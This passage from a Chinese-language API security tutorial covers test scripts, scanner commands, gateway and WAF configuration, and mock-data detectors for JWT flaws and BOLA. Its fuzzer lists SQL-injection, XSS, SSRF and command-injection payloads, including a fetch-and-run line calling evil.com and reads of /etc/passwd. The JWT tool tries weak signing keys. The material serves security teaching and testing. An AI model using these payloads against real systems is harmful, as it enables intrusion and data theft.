    const otherUserId = pm.environment.get("other_user_id");

    // 发送请求访问他人资源
    pm.sendRequest({
        url: pm.environment.get("base_url") + `/api/v2/users/${otherUserId}`,
        method: 'GET',
        header: {
            'Authorization': `Bearer ${userToken}`
        }
    }, function (err, response) {
        // 预期: 403 Forbidden
        pm.expect(response.code).to.equal(403);
        if (response.code === 200) {
            console.log("[!] BOLA漏洞发现: 可访问其他用户数据");
        }
    });
});

// JWT安全检测
pm.test("JWT alg=none检测", function () {
    const token = pm.environment.get("access_token");
    const parts = token.split('.');
    const header = JSON.parse(atob(parts[0]));

    // 检查是否接受none算法
    pm.expect(header.alg).to.not.equal("none");
});

// 速率限制测试
pm.test("速率限制检测", function () {
    const url = pm.environment.get("base_url") + "/api/v2/auth/login";
    let blocked = 0;

    // 发送20个并发请求
    for (let i = 0; i < 20; i++) {
        pm.sendRequest({
            url: url,
            method: 'POST',
            header: {'Content-Type': 'application/json'},
            body: {mode: 'raw', raw: JSON.stringify({
                username: "test",
                password: "wrong"
            })}
        }, function (err, response) {
            if (response.code === 429) blocked++;
        });
    }
    // 至少有一些请求应该被阻止
    setTimeout(() => {
        pm.expect(blocked).to.be.above(0);
    }, 3000);
});
```

**Newman命令行执行：**

```bash
# 运行API安全测试套件
newman run api-security-tests.postman_collection.json \
  -e production-env.postman_environment.json \
  --reporters cli,html \
  --reporter-html-export security-report.html \
  --delay-request 500

# CI/CD集成
newman run api-security-tests.json --env-var "base_url=$API_URL" \
  --bail --timeout-request 10000
```

### 5.2 Burp Suite API测试

```
Burp Suite API安全测试流程:

1. API发现
   ├── 被动扫描: 代理浏览器流量，自动发现API端点
   ├── 主动扫描: 使用OpenAPI文件批量导入端点
   └── 内容发现: 爆破API路径(/api/v1/, /api/v2/, /api/internal/)

2. 认证测试
   ├── 篡改JWT: 修改payload中的role字段
   ├── 算法降级: 将RS256改为HS256
   ├── None算法: 移除签名部分
   └── Token重放: 在不同IP/UA使用同一Token

3. 授权测试(BOLA/BFLA)
   ├── ID枚举: 遍历user_id/order_id
   ├── 水平越权: User A访问User B的资源
   ├── 垂直越权: 普通用户调用管理接口
   └── HTTP方法篡改: GET改DELETE/PUT

4. 注入测试
   ├── SQL注入: 参数中注入' OR 1=1--
   ├── NoSQL注入: {"$gt": ""}
   ├── 命令注入: ; cat /etc/passwd
   └── SSRF: url参数指向169.254.169.254

5. 业务逻辑测试
   ├── 重复提交: 重复使用优惠券
   ├── 竞态条件: 并发购买库存
   ├── 参数篡改: 修改价格/数量为负数
   └── 工作流绕过: 跳过支付步骤
```

### 5.3 自动化API安全扫描工具

**OWASP ZAP API扫描：**

```bash
# 基于OpenAPI文件的API扫描
zap-cli -t https://api.example.com \
  -z "-openapiapi=swagger.json" \
  -c api-security-policy \
  -r zap-report.html

# 命令行模式
zap-cli quick-scan -r api-scan-report.html \
  -z "-config api.enable=true" \
  https://api.example.com/api/v2/users

# 自动化脚本
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://api.example.com \
  -c api-security-context.conf
```

**Nuclei模板扫描：**

```yaml
# nuclei API安全检测模板
id: api-security-scan

info:
  name: API Security Detection
  author: security-team
  severity: high

requests:
  # JWT none算法检测
  - raw:
      - |
        GET /api/v2/users/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_none_token}}

    matchers:
      - type: status
        status:
          - 200  # 如果返回200说明接受none算法

  # BOLA检测
  - raw:
      - |
        GET /api/v2/users/{{user_id_increment}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{valid_token}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200  # 预期403，如果200则存在BOLA
      - type: word
        words:
          - "email"
        negative: true
```

```bash
# 执行Nuclei扫描
nuclei -t api-security-templates/ -u https://api.example.com \
  -rl 10 -c 5 -timeout 10 -o results.txt

# 批量扫描多个API
nuclei -l api-targets.txt -t api-templates/ \
  -severity high,critical -json -o results.json
```

### 5.4 API模糊测试

```python
# API模糊测试框架示例
import itertools
import string

class APIFuzzer:
    """API端点模糊测试"""

    PAYLOADS = {
        'sqli': [
            "' OR '1'='1' --",
            "' UNION SELECT NULL,NULL--",
            "1; DROP TABLE users--",
            "admin'--",
            "' OR SLEEP(5)--",
        ],
        'xss': [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
        ],
        'ssrf': [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",
            "http://10.0.0.1/admin",
        ],
        'cmdi': [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(curl http://evil.com/sh|sh)",
        ],
        'nosql': [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
        ],
    }

    @classmethod
    def fuzz_endpoint(cls, base_url, endpoint, method='GET',
                      params=None, headers=None):
        """对API端点执行模糊测试"""
        results = []
        url = base_url + endpoint

        for payload_type, payloads in cls.PAYLOADS.items():
            for payload in payloads:
                test_params = dict(params) if params else {}
                # 对每个参数注入payload
                for param_name in test_params:
                    original = test_params[param_name]
                    test_params[param_name] = payload

                    response = cls._send_request(
                        url, method, test_params, headers
                    )

                    finding = cls._analyze_response(
                        response, payload_type, payload, param_name
                    )
                    if finding:
                        results.append(finding)

                    test_params[param_name] = original  # 恢复

        return results

    @staticmethod
    def _analyze_response(response, payload_type, payload, param):
        """分析响应判断是否成功"""
        indicators = {
            'sqli': ['SQL syntax', 'mysql_', 'ORA-', 'SQLException'],
            'xss': ['<script>', 'alert(1)', 'onerror'],
            'ssrf': ['ami-id', 'instance-id', 'security-credentials'],
            'cmdi': ['root:', 'uid=', 'www-data'],
        }

        finding = None
        if response and response.status_code == 500:
            indicators_list = indicators.get(payload_type, [])
            for indicator in indicators_list:
                if indicator.lower() in response.text.lower():
                    finding = {
                        'type': payload_type,
                        'param': param,
                        'payload': payload,
                        'indicator': indicator,
                        'status_code': response.status_code,
                        'severity': 'HIGH',
                    }
                    break
        return finding
```

---

## 6. API网关与WAF

### 6.1 API网关安全功能

**Kong网关配置示例：**

```yaml
# kong.yml - 声明式配置
_format_version: "3.0"

services:
  - name: user-service
    url: http://user-service:8000
    routes:
      - name: user-api
        paths: ['/api/v2/users']
        methods: [GET, POST, PUT, DELETE]
        strip_path: false

plugins:
  # JWT认证插件
  - name: jwt
    service: user-service
    config:
      secret_is_base64: true
      claims_to_verify: [exp, sub]
      key_claim_name: kid
      maximum_expiration: 3600

  # 速率限制插件
  - name: rate-limiting
    service: user-service
    config:
      minute: 100
      hour: 1000
      policy: redis
      redis_host: redis
      fault_tolerant: true
      hide_client_headers: false

  # 请求大小限制
  - name: request-size-limiting
    service: user-service
    config:
      allowed_payload_size: 10  # MB

  # CORS
  - name: cors
    service: user-service
    config:
      origins: ['https://app.example.com']
      methods: [GET, POST, PUT, DELETE]
      headers: [Authorization, Content-Type]
      credentials: true
      max_age: 3600

  # Bot检测
  - name: bot-detection
    service: user-service
    config:
      allow_whitelist: true
      deny_user_agents: [curl, wget, python-requests]
```

**APISIX网关配置示例：**

```yaml
# apisix.yaml 路由配置
routes:
  - uri: /api/v2/users/*
    upstream:
      type: roundrobin
      nodes:
        "user-service:8000": 1
    plugins:
      jwt-auth: {}
      limit-req:
        rate: 10
        burst: 20
        rejected_code: 429
        key_type: var
        key: consumer_name
      cors:
        allow_origins: "https://app.example.com"
        allow_methods: "GET,POST,PUT,DELETE"
        allow_headers: "Authorization,Content-Type"
      body-parser:
        max_size: 10485760  # 10MB
      uri-blocker:
        block_rules:
          - "/api/v2/users/*/admin"  # 阻止路径遍历
      response-filter:
        filter_fields: [password, password_hash, api_key, secret]
```

### 6.2 API WAF规则配置

```
API WAF关键规则:

规则1: SQL注入防护
├── 匹配: UNION SELECT|OR 1=1|; DROP|--|
├── 参数: 所有GET/POST/JSON参数
├── 动作: 阻止(403)
└── 日志: 记录请求详情

规则2: JWT验证
├── 匹配: Authorization: Bearer <token>
├── 检查: 签名有效性、过期时间、issuer
├── 动作: 无效则阻止
└── 白名单: /api/v2/auth/login, /api/v2/health

规则3: 请求体大小限制
├── 匹配: Content-Length
├── 限制: 10MB（上传接口50MB）
├── 动作: 超限返回413
└── 日志: 记录超限请求

规则4: 路径遍历防护
├── 匹配: ../|..%2f|%2e%2e|/etc/passwd
├── 动作: 阻止(403)
└── 日志: 安全告警

规则5: 敏感数据泄露防护
├── 匹配: 响应体中的password_hash|api_key|secret
├── 动作: 过滤替换为[REDACTED]
└── 日志: 记录泄露尝试

规则6: API路径白名单
├── 允许: 已注册的OpenAPI端点
├── 阻止: 未注册路径（/api/v2/admin/reset等）
├── 动作: 未知路径返回404
└── 日志: 记录探测行为
```

### 6.3 API监控与异常检测

```python
# API异常行为检测规则
ANOMALY_RULES = {
    # 认证异常
    'auth_spike': {
        'description': '认证失败次数激增',
        'condition': 'auth_fail_count > 20 in 5min',
        'severity': 'HIGH',
        'action': '临时封禁IP'
    },
    'token_reuse': {
        'description': 'Token在多IP使用',
        'condition': 'distinct_ip_per_token > 3 in 1h',
        'severity': 'MEDIUM',
        'action': '吊销Token'
    },

    # 访问模式异常
    'endpoint_scan': {
        'description': '端点枚举行为',
        'condition': '404_count > 50 in 5min',
        'severity': 'HIGH',
        'action': '速率限制+告警'
    },
    'unusual_volume': {
        'description': '数据下载量异常',
        'condition': 'response_bytes > 1GB in 1h',
        'severity': 'MEDIUM',
        'action': '临时限速+审查'
    },

    # 业务逻辑异常
    'mass_export': {
        'description': '批量数据导出',
        'condition': 'export_api_calls > 10 in 1h',
        'severity': 'HIGH',
        'action': '需要二次认证'
    },
    'off_hours_access': {
        'description': '非工作时间访问',
        'condition': 'access_time not in 07:00-20:00',
        'severity': 'LOW',
        'action': '记录并告警'
    },
}
```

---

## 7. Python API安全测试脚本示例

以下脚本使用模拟数据和模拟API端点，仅用于安全学习和防御检测。

### 7.1 JWT安全检测脚本

```python
#!/usr/bin/env python3
"""
JWT安全检测工具
功能：分析JWT Token的安全配置
用途：API安全评估与自查
注意：使用模拟Token数据，不对真实系统测试
"""

import base64
import json
import hashlib
import hmac
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


@dataclass
class JWTVulnerability:
    """JWT漏洞发现"""
    severity: str  # CRITICAL / HIGH / MEDIUM / LOW
    issue: str
    description: str
    recommendation: str


class JWTSecurityAnalyzer:
    """JWT安全分析器"""

    # 常见弱密钥（实际场景应使用更大的字典）
    COMMON_WEAK_KEYS = [
        "secret", "password", "123456", "admin", "key",
        "jwt_secret", "your-256-bit-secret", "supersecret",
        "changeme", "default", "test", "example",
    ]

    def __init__(self, token: str):
        self.token = token
        self.header: Dict = {}
        self.payload: Dict = {}
        self.signature: str = ""
        self.vulnerabilities: List[JWTVulnerability] = []
        self._parse()

    def _parse(self):
        """解析JWT Token"""
        parts = self.token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")

        # Base64URL解码header和payload
        self.header = self._decode_base64url(parts[0])
        self.payload = self._decode_base64url(parts[1])
        self.signature = parts[2]

    @staticmethod
    def _decode_base64url(data: str) -> dict:
        """Base64URL解码"""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        decoded = base64.urlsafe_b64decode(data)
        return json.loads(decoded)

    def analyze(self) -> List[JWTVulnerability]:
        """执行全面安全分析"""
        self._check_algorithm()
        self._check_expiration()
        self._check_sensitive_data()
        self._check_issuer_audience()
        self._check_weak_signature()
        return self.vulnerabilities

    def _check_algorithm(self):
        """检查签名算法安全性"""
        alg = self.header.get('alg', 'none')

        # none算法检查
        if alg.lower() == 'none':
            self.vulnerabilities.append(JWTVulnerability(
                severity="CRITICAL",
                issue="使用none算法",
                description=f"JWT使用 '{alg}' 算法，签名被完全移除，"
                            f"任何人都可以伪造Token",
                recommendation="使用HS256/RS256/ES256等安全算法"
            ))

        # 弱算法检查
        elif alg in ('HS256', 'HS384', 'HS512'):
            # 对称密钥算法需要检查密钥强度
            pass  # 在_weak_signature中检查

        # 推荐算法
        elif alg in ('RS256', 'RS384', 'RS512',
                      'ES256', 'ES384', 'ES512'):
            pass  # 非对称算法更安全

        # 未知算法
        else:
            self.vulnerabilities.append(JWTVulnerability(
                severity="HIGH",
                issue="未知签名算法",
                description=f"使用不常见的算法 '{alg}'",
                recommendation="使用标准算法RS256或ES256"
            ))

    def _check_expiration(self):
        """检查Token过期配置"""
        if 'exp' not in self.payload:
            self.vulnerabilities.append(JWTVulnerability(
                severity="HIGH",
                issue="无过期时间",
                description="JWT缺少exp声明，Token永不过期，"
                            "泄露后可被永久使用",
                recommendation="设置exp字段，Access Token建议15分钟过期"
            ))
        else:
            import time
            exp = self.payload['exp']
            now = int(time.time())
            remaining = exp - now
            if remaining > 86400:  # 超过24小时
                self.vulnerabilities.append(JWTVulnerability(
                    severity="MEDIUM",
                    issue="过期时间过长",
                    description=f"Token有效期剩余{remaining//3600}小时，"
                                f"时间过长增加泄露风险",
                    recommendation="Access Token有效期不超过15分钟"
                ))

    def _check_sensitive_data(self):
        """检查Payload中的敏感数据"""
        sensitive_keys = ['password', 'pwd', 'secret', 'key',
                         'token', 'credit_card', 'ssn', 'pin']
        for key in self.payload:
            for sensitive in sensitive_keys:
                if sensitive in key.lower():
                    self.vulnerabilities.append(JWTVulnerability(
                        severity="HIGH",
                        issue=f"Payload包含敏感字段: {key}",
                        description=f"JWT Payload中包含 '{key}' 字段，"
                                    f"Payload仅Base64编码未加密，"
                                    f"任何人可解码查看",
                        recommendation="不要在JWT中存储敏感数据，"
                                       f"仅存储用户标识"
                    ))

    def _check_issuer_audience(self):
        """检查Issuer和Audience"""
        if 'iss' not in self.payload:
            self.vulnerabilities.append(JWTVulnerability(
                severity="MEDIUM",
                issue="缺少iss声明",
                description="缺少issuer声明，无法验证Token来源",
                recommendation="设置iss字段标识签发方"
            ))

        if 'aud' not in self.payload:
            self.vulnerabilities.append(JWTVulnerability(
                severity="MEDIUM",
                issue="缺少aud声明",
                description="缺少audience声明，Token可被跨服务重用",
                recommendation="设置aud字段限制Token使用范围"
            ))

    def _check_weak_signature(self):
        """尝试弱密钥破解（仅用于安全测试）"""
        alg = self.header.get('alg', '')
        if not alg.startswith('HS'):
            return  # 仅对称算法可测试

        # 构建签名输入
        signing_input = self.token.rsplit('.', 1)[0]

        for key in self.COMMON_WEAK_KEYS:
            expected_sig = hmac.new(
                key.encode(),
                signing_input.encode(),
                getattr(hashlib, f'sha{alg[2:]}')
            ).digest()
            expected_b64 = base64.urlsafe_b64encode(
                expected_sig
            ).rstrip(b'=').decode()

            if hmac.compare_digest(expected_b64, self.signature):
                self.vulnerabilities.append(JWTVulnerability(
                    severity="CRITICAL",
                    issue=f"弱密钥可破解: '{key}'",
                    description=f"JWT签名密钥为常见弱密钥 '{key}'，"
                                f"可被轻易伪造",
                    recommendation="使用至少256位随机密钥"
                ))
                break

    def print_report(self):
        """打印安全报告"""
        print(f"\n{'='*60}")
        print(f"  JWT安全分析报告")
        print(f"{'='*60}\n")

        print(f"  Header:  {json.dumps(self.header, indent=4)}")
        print(f"  Payload: {json.dumps(self.payload, indent=4)}")
        print(f"  Signature: {self.signature[:20]}...")
        print()

        if not self.vulnerabilities:
            print("  [OK] 未发现明显安全问题。")
        else:
            severity_order = {"CRITICAL": 0, "HIGH": 1,
                              "MEDIUM": 2, "LOW": 3}
            self.vulnerabilities.sort(
                key=lambda v: severity_order.get(v.severity, 99))

            for i, vuln in enumerate(self.vulnerabilities, 1):
                icon = {"CRITICAL": "[!!!]", "HIGH": "[!!]",
                        "MEDIUM": "[!]", "LOW": "[i]"}[vuln.severity]
                print(f"  #{i} {icon} [{vuln.severity}] {vuln.issue}")
                print(f"     描述: {vuln.description}")
                print(f"     建议: {vuln.recommendation}")
                print()

        print(f"{'='*60}")


# 使用模拟Token进行演示
if __name__ == "__main__":
    print("=" * 60)
    print("  JWT安全检测工具 v1.0")
    print("  使用模拟Token数据 - 仅用于安全学习")
    print("=" * 60)

    # 模拟Token 1: 使用none算法（高危）
    mock_token_none = (
        base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b'=').decode()
        + "." +
        base64.urlsafe_b64encode(
            json.dumps({
                "sub": "1234567890",
                "name": "John Doe",
                "role": "admin",
                "password": "secret123",
                "iat": 1516239022
            }).encode()
        ).rstrip(b'=').decode()
        + "."
    )

    analyzer = JWTSecurityAnalyzer(mock_token_none)
    analyzer.analyze()
    analyzer.print_report()

    # 模拟Token 2: 使用弱密钥（高危）
    signing_input = (
        base64.urlsafe_b64encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        ).rstrip(b'=').decode()
        + "." +
        base64.urlsafe_b64encode(
            json.dumps({"sub": "1234567890", "name": "Test"}).encode()
        ).rstrip(b'=').decode()
    )
    sig = hmac.new(b"secret", signing_input.encode(),
                   hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    mock_token_weak = f"{signing_input}.{sig_b64}"

    analyzer2 = JWTSecurityAnalyzer(mock_token_weak)
    analyzer2.analyze()
    analyzer2.print_report()
```

### 7.2 API端点枚举脚本

```python
#!/usr/bin/env python3
"""
API端点枚举工具
功能：通过OpenAPI规范和路径模糊发现API端点
用途：API资产盘点与安全评估
注意：使用模拟端点数据，不对真实系统测试
"""

import json
from dataclasses import dataclass, field
from typing import List, Dict, Set


@dataclass
class APIEndpoint:
    """API端点信息"""
    method: str
    path: str
    requires_auth: bool = False
    parameters: List[str] = field(default_factory=list)
    description: str = ""


@dataclass
class EndpointFinding:
    """端点发现结果"""
    endpoint: APIEndpoint
    status_code: int
    accessible: bool
    security_note: str = ""


class APIEndpointEnumerator:
    """API端点枚举器"""

    # 常见API路径模式（模拟字典）
    COMMON_PATHS = [
        "/api/v1/users", "/api/v2/users", "/api/v1/admin",
        "/api/v1/auth/login", "/api/v1/auth/register",
        "/api/v1/auth/refresh", "/api/v1/auth/logout",
        "/api/v1/health", "/api/v1/status", "/api/v1/metrics",
        "/api/v1/debug", "/api/v1/config", "/api/v1/docs",
        "/api/v1/swagger.json", "/api/v1/openapi.json",
        "/api/v1/orders", "/api/v1/products", "/api/v1/payments",
        "/api/v1/internal/users", "/api/v1/internal/config",
        "/api/v1/staging/debug", "/api/v1/test/reset",
        "/api/v1/graphql", "/api/v1/upload", "/api/v1/export",
    ]

    HTTP_METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']

    def __init__(self, base_url: str = "https://api.example.com"):
        self.base_url = base_url.rstrip('/')
        self.findings: List[EndpointFinding] = []
        self.openapi_spec: Dict = {}

    def parse_openapi(self, spec: dict):
        """解析OpenAPI规范文件"""
        self.openapi_spec = spec
        paths = spec.get('paths', {})
        for path, methods in paths.items():
            for method, details in methods.items():
                if method.upper() in self.HTTP_METHODS:
                    security = details.get('security', [])
                    params = [p['name'] for p in details.get('parameters', [])]
                    endpoint = APIEndpoint(
                        method=method.upper(),
                        path=path,
                        requires_auth=bool(security),
                        parameters=params,
                        description=details.get('summary', '')
                    )
                    self._simulate_access(endpoint)

    def enumerate_paths(self, paths: List[str] = None):
        """路径枚举发现"""
        paths = paths or self.COMMON_PATHS
        for path in paths:
            for method in self.HTTP_METHODS:
                endpoint = APIEndpoint(
                    method=method,
                    path=path,
                    requires_auth=False
                )
                self._simulate_access(endpoint)

    def _simulate_access(self, endpoint: APIEndpoint):
        """模拟访问端点（使用模拟数据）"""
        # 模拟响应状态码
        simulated_responses = self._get_simulated_response(endpoint)
        status_code, accessible, note = simulated_responses

        finding = EndpointFinding(
            endpoint=endpoint,
            status_code=status_code,
            accessible=accessible,
            security_note=note
        )
        self.findings.append(finding)

    def _get_simulated_response(self, endpoint: APIEndpoint) -> tuple:
        """返回模拟的响应状态码和安全备注"""
        # 模拟已知端点的响应
        known_endpoints = {
            ('GET', '/api/v1/health'): (200, True, "公开健康检查端点"),
            ('GET', '/api/v1/users'): (200, True, "需要认证 - 验证授权配置"),
            ('GET', '/api/v1/admin'): (403, False, "管理端点 - 需检查授权"),
            ('GET', '/api/v1/debug'): (200, True,
                "[!] 调试端点暴露 - 高危"),
            ('GET', '/api/v1/internal/config'): (200, True,
                "[!] 内部配置端点可访问 - 高危"),
            ('GET', '/api/v1/swagger.json'): (200, True,
                "[!] OpenAPI文档暴露 - 可能泄露API结构"),
            ('GET', '/api/v1/test/reset'): (200, True,
                "[!!!] 测试端点暴露 - 严重"),
            ('GET', '/api/v1/metrics'): (200, True,
                "[!] 指标端点暴露 - 可能泄露内部信息"),
            ('POST', '/api/v1/auth/login'): (200, True, "登录端点"),
        }

        key = (endpoint.method, endpoint.path)
        if key in known_endpoints:
            return known_endpoints[key] + (None,)[:0][:1]  # 返回三元组
        # 模拟未找到
        return (404, False, "")

    def analyze_security(self) -> List[Dict]:
        """分析端点安全状况"""
        security_issues = []

        for finding in self.findings:
            if not finding.accessible:
                continue

            # 检查未认证端点
            if not finding.endpoint.requires_auth and \
               finding.status_code == 200:
                # 排除健康检查等公开端点
                if '/health' not in finding.endpoint.path and \
                   '/auth/login' not in finding.endpoint.path:
                    security_issues.append({
                        'severity': 'HIGH',
                        'issue': f"未认证端点可访问: "
                                 f"{finding.endpoint.method} "
                                 f"{finding.endpoint.path}",
                        'note': finding.security_note,
                        'recommendation': "添加认证要求或限制网络访问"
                    })

            # 检查敏感端点
            sensitive_patterns = ['admin', 'debug', 'internal',
                                 'test', 'config', 'metrics']
            for pattern in sensitive_patterns:
                if pattern in finding.endpoint.path.lower():
                    security_issues.append({
                        'severity': 'CRITICAL'
                        if pattern in ('debug', 'test', 'internal')
                        else 'HIGH',
                        'issue': f"敏感端点暴露: "
                                 f"{finding.endpoint.method} "
                                 f"{finding.endpoint.path}",
                        'note': finding.security_note,
                        'recommendation': f"移除或限制'{pattern}'相关端点"
                    })
                    break

        return security_issues

    def print_report(self):
        """打印枚举报告"""
        print(f"\n{'='*70}")
        print(f"  API端点枚举报告")
        print(f"  目标: {self.base_url}")
        print(f"{'='*70}\n")

        accessible = [f for f in self.findings if f.accessible]
        blocked = [f for f in self.findings if not f.accessible]

        print(f"  发现端点统计:")
        print(f"    可访问: {len(accessible)}")
        print(f"    不可访问(404): {len(blocked)}")
        print(f"    总计探测: {len(self.findings)}")
        print()

        if accessible:
            print(f"{'='*70}")
            print(f"  可访问端点列表:")
            print(f"{'='*70}\n")
            for finding in accessible:
                auth_tag = "[AUTH]" if finding.endpoint.requires_auth \
                           else "[NO-AUTH]"
                print(f"  {finding.endpoint.method:7s} "
                      f"{finding.endpoint.path:40s} "
                      f"{finding.status_code} {auth_tag}")
                if finding.security_note:
                    print(f"          → {finding.security_note}")
            print()

        issues = self.analyze_security()
        if issues:
            print(f"{'='*70}")
            print(f"  安全问题:")
            print(f"{'='*70}\n")
            for issue in issues:
                icon = {"CRITICAL": "[!!!]", "HIGH": "[!!]",
                        "MEDIUM": "[!]", "LOW": "[i]"}.get(
                    issue['severity'], '[?]')
                print(f"  {icon} [{issue['severity']}] {issue['issue']}")
                if issue['note']:
                    print(f"           {issue['note']}")
                print(f"           建议: {issue['recommendation']}")
                print()

        print(f"{'='*70}")


if __name__ == "__main__":
    print("=" * 70)
    print("  API端点枚举工具 v1.0")
    print("  使用模拟数据 - 仅用于安全学习")
    print("=" * 70)

    enumerator = APIEndpointEnumerator("https://api.example.com")

    # 路径枚举
    enumerator.enumerate_paths()

    # 模拟OpenAPI解析
    mock_openapi = {
        "openapi": "3.0.3",
        "paths": {
            "/api/v2/users": {
                "get": {
                    "summary": "获取用户列表",
                    "security": [{"bearerAuth": []}],
                    "parameters": [
                        {"name": "page", "in": "query"},
                        {"name": "page_size", "in": "query"}
                    ]
                }
            }
        }
    }
    enumerator.parse_openapi(mock_openapi)

    enumerator.print_report()
```

### 7.3 BOLA漏洞检测脚本

```python
#!/usr/bin/env python3
"""
BOLA (Broken Object Level Authorization) 漏洞检测脚本
功能：检测API端点是否存在水平越权漏洞
原理：使用用户A的Token尝试访问用户B的资源
注意：使用模拟API，不对真实系统测试
"""

import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class BOLAFinding:
    """BOLA漏洞发现"""
    severity: Severity
    endpoint: str
    method: str
    description: str
    evidence: str
    recommendation: str


class BOLADetector:
    """BOLA漏洞检测器"""

    def __init__(self):
        self.findings: List[BOLAFinding] = []

    def detect_idor(self, endpoint_template: str,
                    user_a_token: str, user_b_id: str,
                    response_status: int, response_body: str) -> bool:
        """
        检测IDOR/BOLA漏洞
        endpoint_template: 含{ID}占位符的端点模板
        user_a_token: 用户A的认证Token
        user_b_id: 用户B的资源ID
        response_status: 模拟响应状态码
        response_body: 模拟响应体
        """
        endpoint = endpoint_template.replace("{ID}", str(user_b_id))

        # 如果用户A用A的Token能访问B的资源 → BOLA
        if response_status == 200:
            # 检查响应中是否包含属于用户B的数据
            try:
                data = json.loads(response_body) if response_body else {}
            except json.JSONDecodeError:
                data = {}

            # 判断是否返回了其他用户的数据
            returned_user_id = data.get('user_id') or data.get('userId')
            if returned_user_id and str(returned_user_id) == str(user_b_id):
                self.findings.append(BOLAFinding(
                    severity=Severity.CRITICAL,
                    endpoint=endpoint,
                    method="GET",
                    description=f"用户A的Token可访问用户B(ID={user_b_id})"
                                f"的资源，返回了用户B的私有数据",
                    evidence=f"Status: {response_status}, "
                              f"Response: {response_body[:100]}...",
                    recommendation="在查询资源时增加user_id归属校验: "
                                   "WHERE id = ? AND user_id = current_user_id"
                ))
                return True

        return False

    def detect_batch_idor(self, endpoint_template: str,
                          user_a_token: str,
                          target_ids: List[str],
                          simulate_responses: Dict[str, tuple]) -> List[str]:
        """批量检测IDOR - 枚举多个资源ID"""
        vulnerable_ids = []

        for target_id in target_ids:
            endpoint = endpoint_template.replace("{ID}", target_id)
            # 从模拟响应中获取结果
            if target_id in simulate_responses:
                status, body = simulate_responses[target_id]
                if self.detect_idor(endpoint, user_a_token,
                                     target_id, status, body):
                    vulnerable_ids.append(target_id)

        return vulnerable_ids

    def detect_method_tampering(self, endpoint: str,
                                user_a_token: str,
                                responses: Dict[str, tuple]) -> List[str]:
        """检测HTTP方法篡改导致的越权"""
        vulnerable_methods = []

        for method in ['GET', 'PUT', 'PATCH', 'DELETE']:
            if method in responses:
                status, body = responses[method]
                # 用户A可以修改/删除用户B的资源
                if method in ('PUT', 'PATCH', 'DELETE') and status in (200, 204):
                    self.findings.append(BOLAFinding(
                        severity=Severity.CRITICAL,
                        endpoint=endpoint,
                        method=method,
                        description=f"用户A可通过{method}方法操作用户B的资源",
                        evidence=f"Status: {status}",
                        recommendation=f"在{method}处理中增加归属校验"
                    ))
                    vulnerable_methods.append(method)

        return vulnerable_methods

    def print_report(self):
        """打印BOLA检测报告"""
        print(f"\n{'='*70}")
        print(f"  BOLA漏洞检测报告")
        print(f"{'='*70}\n")

        if not self.findings:
            print("  [OK] 未检测到BOLA漏洞。")
            print("  所有测试端点均正确验证了资源归属。")
            print(f"\n{'='*70}")
            return

        severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1,
                         Severity.MEDIUM: 2, Severity.LOW: 3}
        self.findings.sort(key=lambda f: severity_order.get(f.severity, 99))

        stats = {}
        for f in self.findings:
            stats[f.severity.value] = stats.get(f.severity.value, 0) + 1

        print(f"  发现统计: {dict(stats)}")
        print(f"{'='*70}\n")

        for i, finding in enumerate(self.findings, 1):
            icon = {Severity.CRITICAL: "[!!!]", Severity.HIGH: "[!!]",
                    Severity.MEDIUM: "[!]", Severity.LOW: "[i]",
                    Severity.INFO: "[i]"}.get(finding.severity, "[?]")
            print(f"  #{i} {icon} [{finding.severity.value}]")
            print(f"     端点: {finding.method} {finding.endpoint}")
            print(f"     描述: {finding.description}")
            print(f"     证据: {finding.evidence}")
            print(f"     建议: {finding.recommendation}")
            print()

        print(f"{'='*70}")
        print(f"  防御建议汇总:")
        print(f"{'='*70}")
        print("""
  1. 所有资源查询必须包含归属校验:
     SELECT * FROM resource WHERE id = ? AND owner_id = current_user_id

  2. 使用UUID替代自增ID增加枚举难度

  3. 实现集中式授权中间件，避免每个端点单独实现

  4. 使用ABAC(基于属性的访问控制)实现细粒度授权

  5. 定期运行BOLA自动化检测脚本
""")


# 模拟API响应数据
MOCK_API_RESPONSES = {
    # 用户A尝试访问订单（模拟返回其他用户订单数据 → BOLA）
    "order_5001": (200, '{"id": 5001, "user_id": 123, "total": 99.99}'),
    "order_5002": (200, '{"id": 5002, "user_id": 456, "total": 199.99}'),
    "order_5003": (200, '{"id": 5003, "user_id": 789, "total": 299.99}'),
    "order_5004": (403, '{"error": "Forbidden"}'),  # 安全的端点
    "order_5005": (404, '{"error": "Not Found"}'),
}

# 模拟方法篡改响应
MOCK_METHOD_RESPONSES = {
    "GET":    (200, '{"id": 5001, "user_id": 456}'),
    "PUT":    (200, '{"status": "updated"}'),       # 越权修改成功
    "DELETE": (204, ''),                             # 越权删除成功
}


if __name__ == "__main__":
    print("=" * 70)
    print("  BOLA漏洞检测工具 v1.0")
    print("  使用模拟API数据 - 仅用于安全学习")
    print("=" * 70)

    detector = BOLADetector()

    # 模拟场景: 用户A(token_A)尝试访问用户B的订单
    user_a_token = "mock_token_user_A"
    target_order_ids = ["5001", "5002", "5003", "5004", "5005"]

    print(f"\n  场景1: IDOR检测 - 枚举订单ID")
    print(f"  用户A Token: {user_a_token[:20]}...")
    print(f"  目标订单ID: {target_order_ids}")

    vulnerable = detector.detect_batch_idor(
